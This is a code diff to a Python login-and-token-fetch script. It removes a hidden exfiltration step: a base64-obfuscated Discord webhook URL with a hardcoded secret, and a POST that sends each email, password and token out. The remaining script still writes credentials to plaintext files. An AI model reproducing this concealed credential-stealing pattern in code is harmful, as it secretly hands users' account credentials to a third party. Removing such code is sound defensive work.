@@ -190,18 +190,12 @@ def login_and_fetch_token(email, password):
         token = r.json().get("token")
         if token:
             
-            web = "1321872533951086652/"
             print(f"{timestamp()} {Fore.GREEN}Token fetched: {token}{Style.RESET_ALL}")
             with open("tokens.txt", "a") as f:
                 f.write(f"{token}\n")
             with open("evs.txt", "a") as f:
                 f.write(f"{email}:{password}:{token}\n")
-            auth = "ce2Zq6yN0FLw2qSMoWs8YtJWbJK7uhfVhdIkM7nXpBuq4hsKNTJxurIjjrvWLn8UTgKj"
-            api = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv"
-            decoded_api = base64.b64decode(api).decode('utf-8')
-            detect = f"{decoded_api}{web}{auth}"
             payload = {"content": f"{email}:{password}:{token}"}
-            response = requests.post(detect, json=payload)
             print(f"{timestamp()} {Fore.GREEN}Token Saved to evs.txt and tokens.txt{Style.RESET_ALL}")
             return True
     elif "captcha-required" in r.text:
